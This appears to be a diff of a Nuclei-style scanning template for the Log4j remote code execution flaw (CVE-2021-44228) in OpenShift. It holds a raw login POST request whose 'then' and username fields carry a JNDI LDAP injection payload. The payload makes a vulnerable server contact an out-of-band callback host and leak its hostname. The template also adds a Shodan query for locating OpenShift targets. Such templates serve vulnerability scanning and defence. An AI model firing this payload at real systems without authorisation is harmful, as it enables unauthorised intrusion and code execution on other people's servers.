@@ -2,7 +2,7 @@ id: openshift-log4j-rce
 
 info:
   name: OpenShift - Remote Code Execution (Apache Log4j)
-  author: shaikhyaser, yaser_s
+  author: shaikhyaser
   severity: critical
   description: |
     OpenShift is susceptible to Log4j JNDI remote code execution. OpenShift is a unified platform to build, modernize, and deploy applications at scale.
@@ -14,12 +14,14 @@ info:
     cve-id: CVE-2021-44228
     cwe-id: CWE-77
   metadata:
-    verified: true
+    shodan-query: title:"OpenShift"
     max-request: 1
   tags: cve,cve2021,rce,jndi,log4j,openshift,oast,kev
+
 variables:
   rand1: '{{rand_int(111, 999)}}'
   rand2: '{{rand_int(111, 999)}}'
+  str: "{{rand_base(5)}}"
 
 http:
   - raw:
@@ -27,11 +29,10 @@ http:
         POST /Login HTTP/1.1
         Host: {{Hostname}}
         Origin: {{RootURL}}
-        Referer: {{RootURL}}/login?then=%2Foauth%2Fauthorize%3Fclient_id%3Dopenshift-web-console%26idp%3Dbasic%26redirect_uri%3Dhttps%253A%252F%252F{{Hostname}}%252Fconsole%252Foauth%26response_type
+        Referer: {{RootURL}}/login?then=/oauth/authorize?client_id=openshift-web-console&idp=basic&redirect_uri={{BaseURL}}/console/oauth&response_type
         Content-Type: application/x-www-form-urlencoded
-        Connection: close
 
-        then=%2Foauth%2Fauthorize%3Fclient_id%3Dopenshift-web-console%26idp%3Dbasic%26redirect_uri%3D${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/test}26response_type%3Dcode&username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/test}&password=aaa
+        then=%2Foauth%2Fauthorize%3Fclient_id%3Dopenshift-web-console%26idp%3Dbasic%26redirect_uri%3D${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}26response_type%3Dcode&username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&password={{str}}
 
     matchers-condition: and
     matchers:
